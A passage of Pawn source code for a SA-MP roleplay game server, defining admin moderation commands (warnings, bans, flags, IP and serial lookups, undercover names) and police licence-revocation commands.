		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:countdown(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		SetTimer("Three", 1000, 0);
		SetTimer("Two", 2000, 0);
		SetTimer("One", 3000, 0);
		SetTimer("GoGoGo", 4000, 0);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
	}
	return 1;
}

forward Three();
public Three()
{
 	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "3");
	return 1;
}

forward Two();
public Two()
{
	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "2");
	return 1;
}

forward One();
public One()
{
	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "1");
 	return 1;
}

forward GoGoGo();
public GoGoGo()
{
	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "Go!");
 	return 1;
}

CMD:fackick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fackick [playerid/partofname]");


		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pFaction] >= 1 || PlayerInfo[giveplayerid][pLeader] >= 1)
			{
				format(string, sizeof(string), "You have been faction-kicked, by %s.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[giveplayerid][pFaction] = 0;
				PlayerInfo[giveplayerid][pRank] = 0;
				PlayerInfo[giveplayerid][pDuty] = 0;
				PlayerInfo[giveplayerid][pLeader] = 0;
				PlayerInfo[giveplayerid][pDivision] = 0;
				if(!IsValidSkin(GetPlayerSkin(giveplayerid)))
				{
					new rand = random(sizeof(CIV));
					SetPlayerSkin(giveplayerid,CIV[rand]);
					PlayerInfo[giveplayerid][pSkin] = CIV[rand];
				}
				player_remove_vip_toys(giveplayerid);
				pTazer[giveplayerid] = 0;
				SetPlayerToTeamColor(giveplayerid);
				format(string, sizeof(string), "You have faction-kicked %s.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "You can't kick someone from a faction if they're not a member.");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Invalid player specified..");
		}
	}
	return 1;
}

CMD:setmyname(playerid, params[]) {
	new string[128];
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /setmyname [newname]");

	if(PlayerInfo[playerid][pAdmin] >= 4) {
		if(AdminDuty[playerid] != 1)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		if((strfind(params, "Zhao", false) != -1 || strfind(params, "Z_hao", false) != -1 || strfind(params, "Zh_ao", false) != -1 || strfind(params, "Zha_o", false) != -1 || strfind(params, "zao", false) != -1) && PlayerInfo[playerid][pAdmin] < 6)
		    return SendClientMessage(playerid, COLOR_WHITE, "stop ! im zao ! you're not a zao !");

		if(strfind(params, "_", false) == -1 && strcmp(params, "off") != 0)
		    return SendClientMessage(playerid, COLOR_GREY, "Your name must include an underscore ('_').");

		if(strlen(params) > 18)
		    return SendClientMessage(playerid, COLOR_GREY, "Your name exceeds the character limit for names in SA-MP.");

		if(GetPVarInt(playerid, "AdminUndercover") == 0)
		{
			format(string, sizeof(string), "You have temporarily set your name to %s.", params);
			SendClientMessage(playerid, COLOR_YELLOW, string);
			SendClientMessage(playerid, COLOR_YELLOW, "Use '/setmyname off' to go back to your admin name.");
			SetPVarInt(playerid, "AdminUndercover", 1);
			SetPlayerName(playerid, params);
			PlayerInfo[playerid][pAccent] = 25;
			format(string, sizeof(string), "%s has changed their name to %s.", PlayerInfo[playerid][pAdminName], params);
			Log("logs/undercover.log", string);
		}
		else
		{
			format(string, sizeof(string), "You changed your name back to %s", PlayerInfo[playerid][pAdminName]);
			SendClientMessage(playerid, COLOR_YELLOW, string);
			SetPVarInt(playerid, "AdminUndercover", 0);
			PlayerInfo[playerid][pAccent] = 0;
			SetPlayerName(playerid, PlayerInfo[playerid][pAdminName]);
		}
	}
	return 1;
}

CMD:jetpack(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}
    if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] < 4) {
        JetPack[playerid] = 1;
        SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USEJETPACK);
        return 1;
    }
    new string[128], plo;
    if(sscanf(params, "u", plo)) {
        SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /jetpack [playerid/partofname]");
        return 1;
    }
    if(IsPlayerConnected(plo)) {
        if(plo != INVALID_PLAYER_ID) {
            if(PlayerInfo[playerid][pAdmin] >= 4) {
                SendClientMessage(plo, COLOR_GRAD1, "Enjoy your new jetpack!");
                JetPack[plo] = 1;
                SetPlayerSpecialAction(plo, SPECIAL_ACTION_USEJETPACK);
                format(string, sizeof(string), "AdmCmd: %s has received a jetpack from %s", GetPlayerNameEx(plo), GetPlayerNameEx(playerid));
                ABroadCast(COLOR_LIGHTRED, string, 1);
            }
            else {
                SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
            }
        }
    }
    else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
    return 1;
}

CMD:serial(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
		}
		new giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /serial [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			new string[256];
			new serial[128];
			gpci(giveplayerid, serial, sizeof(serial));
			format(string, sizeof(string), "(ID: %d) - (Name: %s) - (Serial: %s)", giveplayerid, GetPlayerNameEx(giveplayerid), serial);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:ipcheck(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
		}
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ipcheck [playerid/partofname]");

		if(giveplayerid == INVALID_PLAYER_ID) return 1;
		if(IsPlayerConnected(giveplayerid))
		{
			new playerip[32];
			GetPlayerIp(giveplayerid, playerip, sizeof(playerip));
			format(string, sizeof(string), "(ID: %d) - (Name: %s) - (IP: %s)", giveplayerid, GetPlayerNameEx(giveplayerid), playerip);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:oipcheck(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 2)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /oipcheck [name]");

	new
		string[128],
		szPlayerName[MAX_PLAYER_NAME];

	mysql_escape_string(params, szPlayerName,MAX_PLAYER_NAME,sqldb);

	mysql_format(sqldb,string, sizeof(string), "SELECT Username, LastIP FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,string, "OnQueryFinished","ii",THREAD_OFFLINE_IP_CHECK,playerid);
	return 1;
}

CMD:ip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		{
			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
		}
		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ip [ip]");

		new string[128], IP[32];

		foreach(Player, i)
		{
			GetPlayerIp(i, IP, sizeof(IP));
			if(strfind(IP, params, true) != -1)
			{
				format(string, sizeof(string), "Player: %s (ID: %d) | IP: %s", GetPlayerNameEx(i), i, IP);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
		}
	}

	return 1;
}

CMD:unbanip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4 || PlayerInfo[playerid][pBanAppealer] >= 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		{
			SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
		}
		if(isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /unbanip [ip]");
		if(IsValidIP(params)) return SendClientMessage(playerid, COLOR_WHITE, "That is not a valid IP address!");

		new string[128];
		RemoveBan(params);
		format(string, 128, "AdmCmd: %s has unbanned IP %s", GetPlayerNameEx(playerid), params);
		ABroadCast(COLOR_LIGHTRED,string,2);
		format(string, sizeof(string), "AdmCmd: %s has unbanned IP %s", GetPlayerNameEx(playerid), params);
		Log("logs/ban.log", string);
	}

	return 1;
}

CMD:unban(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4 || PlayerInfo[playerid][pBanAppealer] >= 1) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
			return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
		    szPlayerName[MAX_PLAYER_NAME],
			string[128];

		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /unban [playername]");

		mysql_escape_string(params, szPlayerName,MAX_PLAYER_NAME ,sqldb);

		mysql_format(sqldb,string, sizeof(string), "SELECT Banned, Permabanned, Warnings, LastIP, Username FROM players WHERE Username = '%s'", szPlayerName);
		mysql_tquery(sqldb,string, "OnQueryFinished","ii",THREAD_CHECK_BANNED,playerid);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:oban(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 4)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
   		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	new
		string[128],
		playername[MAX_PLAYER_NAME],
		reason[64];

	if(sscanf(params, "s[MAX_PLAYER_NAME]s[64]", playername, reason))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /oban [playername] [reason]");

    new
		giveplayerid = ReturnUser(playername);

	if(IsPlayerConnected(giveplayerid))
		return SendClientMessage(playerid, COLOR_GRAD2, "That player is online, use /ban for online players.");

	SetPVarString(playerid, "obanreason", reason);

	new
	    szPlayerName[MAX_PLAYER_NAME];

	mysql_escape_string(playername, szPlayerName,MAX_PLAYER_NAME,sqldb);

	mysql_format(sqldb,string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, ID FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,string,"OnQueryFinished","ii",THREAD_OFFLINE_BAN,playerid);
	return 1;
}

CMD:mole(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GREY, "You're not authorized to use that command!");

 	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
  		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	new
		string[128];

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /mole [text]");

	format(string, sizeof(string), "SMS: %s, Sender: MOLE (555)",params);
	SendClientMessageToAllEx(COLOR_YELLOW, string);
	return 1;
}

CMD:warn(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			giveplayerid,
			reason[64];

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /warn [playerid/partofname] [reason]");

		if(IsPlayerConnected(giveplayerid)) {
			if(PlayerInfo[giveplayerid][pAdmin] >= 1)
				return SendClientMessage(playerid, COLOR_GRAD2, "Admins can't be warned!");

			PlayerInfo[giveplayerid][pWarns] += 1;

			if(PlayerInfo[giveplayerid][pWarns] >= 3) {
				new ip[32];
				GetPlayerIp(giveplayerid,ip,sizeof(ip));
				format(string, sizeof(string), "AdmCmd: %s (IP: %s) was banned by %s (had 3 Warnings), reason: %s", GetPlayerNameEx(giveplayerid), ip, GetPlayerNameEx(playerid), reason);
				Log("logs/ban.log", string);
				format(string, sizeof(string), "AdmCmd: %s was banned by %s (had 3 Warnings), reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[giveplayerid][pBanned] = 1;
				AddBan(ip);
				Kick(giveplayerid);
				return 1;
			}

			format(string, sizeof(string), "AdmCmd: %s was warned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);
			format(string, sizeof(string), "AdmCmd: %s was warned by %s, reason: %s", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			Log("logs/admin.log", string);
			punishmentLog(giveplayerid, playerid, 1, string, reason);

			format(string, sizeof(string), "You were warned by %s, reason: %s", GetPlayerNameEx(playerid), reason);
			SendClientMessage(giveplayerid, COLOR_LIGHTRED, string);
			return 1;

		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	return 1;
}

CMD:owarn(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	new
		string[128],
		name[MAX_PLAYER_NAME],
		reason[64];

	if(sscanf(params, "s[24]s[64]", name, reason))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /owarn [name] [reason]");

	new
		giveplayerid = ReturnUser(name);

	if(giveplayerid != INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD2, "That player is online, use /warn for online players.");

	SetPVarString(playerid, "owarnreason", reason);

	new
	    szPlayerName[MAX_PLAYER_NAME];

	mysql_escape_string(name,szPlayerName,MAX_PLAYER_NAME,sqldb);

	mysql_format(sqldb,string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, Warnings, ID FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,string,"OnQueryFinished","ii",THREAD_OFFLINE_WARN,playerid);
	return 1;
}

CMD:ofine(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3)
		return SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

	new
		string[128],
		name[MAX_PLAYER_NAME],
		amount,
		reason[64];

	if(sscanf(params, "s[MAX_PLAYER_NAME]ds[64]", name, amount, reason))
		return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ofine [name] [amount] [reason]");

	new
		giveplayerid = ReturnUser(name);

	if(giveplayerid != INVALID_PLAYER_ID)
		return SendClientMessage(playerid, COLOR_GRAD2, "That player is online, use /fine for online players.");

	if(amount < 1)
		return SendClientMessage(playerid, COLOR_GRAD2, "Amount must be greater than 0.");

	SetPVarString(playerid, "ofinereason", reason);
	SetPVarInt(playerid, "ofineamount", amount);

	new
	    szPlayerName[MAX_PLAYER_NAME];

	mysql_escape_string(name,szPlayerName,MAX_PLAYER_NAME,sqldb);

	mysql_format(sqldb,string, sizeof(string), "SELECT Permabanned, Banned, AdminLevel, Username, LastIP, Bank, Cash FROM players WHERE Username = '%s'", szPlayerName);
	mysql_tquery(sqldb,string, "OnQueryFinished","ii",THREAD_OFFLINE_FINE,playerid);

	return 1;
}

CMD:showflags(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		new string[128];
		SendClientMessage(playerid, COLOR_YELLOW, "Outstanding flags: (date format is DD/MM/YYYY as of 03/05/2012)");
		new fCounter;
		foreach(Player, i)
		{
			if(strlen(PlayerInfo[i][pFlag]) > 0)
			{
				format(string, sizeof(string), "%s (ID %d) | Reason: %s.",GetPlayerNameEx(i),i,PlayerInfo[i][pFlag]);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				fCounter += 1;
			}
		}
		if(fCounter <= 0)
		{
			SendClientMessage(playerid, COLOR_GRAD1, "None.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "   You're not authorized to use that command!");
	}
	return 1;
}

CMD:oflag(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new
			string[128],
			name[MAX_PLAYER_NAME],
			reason[64];

		if(sscanf(params, "s[24]s[64]", name, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /oflag [name] [reason]");

    	new
			giveplayerid = ReturnUser(name);

        if(IsPlayerConnected(giveplayerid)) {
			AddFlag(giveplayerid, playerid, reason);
			SendClientMessage(playerid, COLOR_WHITE, "The player is online and has been flagged!");

			format(string, sizeof(string), "AdmCmd: %s was flagged by %s, reason: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);
		} else {
		    new
		        szPlayerName[MAX_PLAYER_NAME],
		        szFlag[128],
		        szQuery[128];

			mysql_escape_string(name,szPlayerName,MAX_PLAYER_NAME,sqldb);

			mysql_escape_string(reason, szFlag,128,sqldb);
			SetPVarString(playerid, "offline_flag", szFlag);
			SetPVarString(playerid, "offline_flag_target", szPlayerName);

			mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szPlayerName);
			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii",THREAD_OFFLINE_FLAG,playerid);
		}
		return 1;
	}
	return 1;
}

CMD:flag(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1) {
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /flag [playerid/partofname] [reason]");

		if(giveplayerid != INVALID_PLAYER_ID) {
			AddFlag(giveplayerid, playerid, reason);
			format(string, sizeof(string), "AdmCmd: %s has flagged %s, reason: %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);
			return 1;
		} else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	else if(PlayerInfo[playerid][pHelper] >= 1) {
		new string[128], giveplayerid, reason[64];
		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /flag [playerid/partofname] [reason]");

		if(giveplayerid != INVALID_PLAYER_ID) {
		    if(strlen(PlayerInfo[giveplayerid][pFlag]) != 0) {
				return SendClientMessage(playerid, COLOR_GREY, "This player already has an active flag, helpers can only create flags on players who don't have them already.");
			}

			AddFlag(giveplayerid, playerid, reason);
			format(string, sizeof(string), "AdmCmd: %s was flagged by Helper %s, reason: %s.", GetPlayerNameEx(giveplayerid), GetPlayerNameEx(playerid), reason);
			ABroadCast(COLOR_LIGHTRED, string, 1);

			format(string, sizeof(string), "Your flag on %s has been placed with the reason of %s.", GetPlayerNameEx(giveplayerid), reason);
			SendClientMessage(playerid, COLOR_WHITE, string);
			return 1;
		} else SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	}
	return 1;
}

CMD:clearflag(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 2)
	{
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /clearflag [playerid/partofname]");
		}
		else if(IsPlayerConnected(iTargetID)) {
			if(!isnull(PlayerInfo[iTargetID][pFlag])) {

				new
					szMessage[59 + (MAX_PLAYER_NAME * 2)];

                format(PlayerInfo[iTargetID][pFlag], 128, "");
				format(szMessage, sizeof(szMessage), "{AA3333}AdmWarning{FFFF00}: %s has cleared all flags on %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
				PlayerInfo[iTargetID][pInt] = GetPlayerInterior(iTargetID);

				if(GetPVarType(iTargetID, "tabbedVW") != 0) {
					PlayerInfo[iTargetID][pVW] = GetPVarInt(iTargetID, "tabbedVW");
				} else PlayerInfo[iTargetID][pVW] = GetPlayerVirtualWorld(iTargetID);

				GetPlayerIp(iTargetID, PlayerInfo[iTargetID][pIP], 32);
				GetPlayerPos(iTargetID, PlayerInfo[iTargetID][pPos_x], PlayerInfo[iTargetID][pPos_y], PlayerInfo[iTargetID][pPos_z]);
				GetPlayerFacingAngle(iTargetID, PlayerInfo[iTargetID][pPos_r]);
				OnPlayerStatsUpdate(iTargetID);
				return ABroadCast(COLOR_YELLOW, szMessage, 1);
			}
			SendClientMessage(playerid, COLOR_GRAD1, "That player has no outstanding flags.");
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	return 1;
}

CMD:revokedl(playerid, params[])
{
	if(IsACop(playerid)) {
		new
			string[128],
			giveplayerid,
			reason[64],
			copveh = GetPlayerVehicleID(playerid);

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /revokedl [playerid/partofname] [reason]");

		if((IsACopCar(copveh)) || (IsAFBICar(copveh))) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pCarLic] == 0)
					return SendClientMessage(playerid, COLOR_GRAD2, "This player has no driver's license to revoke.");

				new
					szRank[64],
					szEmployer[64],
					szDivision[64];
				GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

				format(string,sizeof(string),"%s %s %s has revoked your driver's license, reason: %s.",szEmployer, szRank, GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);

				format(string,sizeof(string),"HQ: %s %s %s has revoked %s's driver's license, reason: %s.",szEmployer, szRank, GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				SendRadioMessage(1,TEAM_BLUE_COLOR,string);
				SendRadioMessage(2,TEAM_BLUE_COLOR,string);

				SendClientMessage(giveplayerid,COLOR_WHITE,"(( A new driver's license can be acquired at City Hall. If you deem this action as abuse, contact an admin. ))");
				format(string, sizeof(string), "%s took %s's driver's license. REASON: %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pCarLic] = 0;
				return 1;
			} else SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
		} else SendClientMessage(playerid, COLOR_GRAD2,"You must be in a faction vehicle to do this.");
	} else SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do this.");
	return 1;
}

CMD:revokeboatdl(playerid, params[])
{
	if(IsACop(playerid)) {
		new
			string[128],
			giveplayerid,
			reason[64],
			copveh = GetPlayerVehicleID(playerid);

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /revokeboatdl [playerid/partofname] [reason]");

		if((IsACopCar(copveh)) || (IsAFBICar(copveh))) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pBoatLic] == 0)
					return SendClientMessage(playerid, COLOR_GRAD2, "This player has no boating license to revoke.");

				new
					szRank[64],
					szEmployer[64],
					szDivision[64];
				GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

				format(string,sizeof(string),"%s %s %s has revoked your boating license, reason: %s.",szEmployer, szRank, GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);

				format(string,sizeof(string),"HQ: %s %s %s has revoked %s's boating license, reason: %s.",szEmployer, szRank, GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				SendRadioMessage(1,TEAM_BLUE_COLOR,string);
				SendRadioMessage(2,TEAM_BLUE_COLOR,string);

				SendClientMessage(giveplayerid,COLOR_WHITE,"(( A new boating license can be acquired at City Hall. If you deem this action as abuse, contact an admin. ))");
				format(string, sizeof(string), "%s took %s's boating license. REASON: %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pBoatLic] = 0;
				return 1;
			} else SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
		} else SendClientMessage(playerid, COLOR_GRAD2,"You must be in a faction vehicle to do this.");
	} else SendClientMessage(playerid, COLOR_GRAD2, "You're not authorised to do this.");
	return 1;
}

CMD:revokeairdl(playerid, params[])
{
	if(IsACop(playerid)) {
		new
			string[128],
			giveplayerid,
			reason[64],
			copveh = GetPlayerVehicleID(playerid);

		if(sscanf(params, "us[64]", giveplayerid, reason))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /revokeairdl [playerid/partofname] [reason]");

		if((IsACopCar(copveh)) || (IsAFBICar(copveh))) {
			if(IsPlayerConnected(giveplayerid)) {
				if(PlayerInfo[giveplayerid][pFlyLic] == 0)
					return SendClientMessage(playerid, COLOR_GRAD2, "This player has no pilot license to revoke.");

				new
					szRank[64],
					szEmployer[64],
					szDivision[64];
				GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

				format(string,sizeof(string),"%s %s %s has revoked your pilot license, reason: %s.",szEmployer, szRank, GetPlayerNameEx(playerid), reason);
				SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);

				format(string,sizeof(string),"HQ: %s %s %s has revoked %s's pilot license, reason: %s.",szEmployer, szRank, GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				SendRadioMessage(1,TEAM_BLUE_COLOR,string);
				SendRadioMessage(2,TEAM_BLUE_COLOR,string);

				SendClientMessage(giveplayerid,COLOR_WHITE,"(( A new pilot license can be acquired at City Hall. If you deem this action as abuse, contact an admin. ))");
				format(string, sizeof(string), "%s took %s's pilot license. REASON: %s.", GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),reason);
				Log("logs/licenses.log", string);
				PlayerInfo[giveplayerid][pFlyLic] = 0;
				return 1;
			} else SendClientMessage(playerid, COLOR_GRAD2, "Invalid player specified.");
		} else SendClientMessage(playerid, COLOR_GRAD2,"You must be in a faction vehicle to do this.");
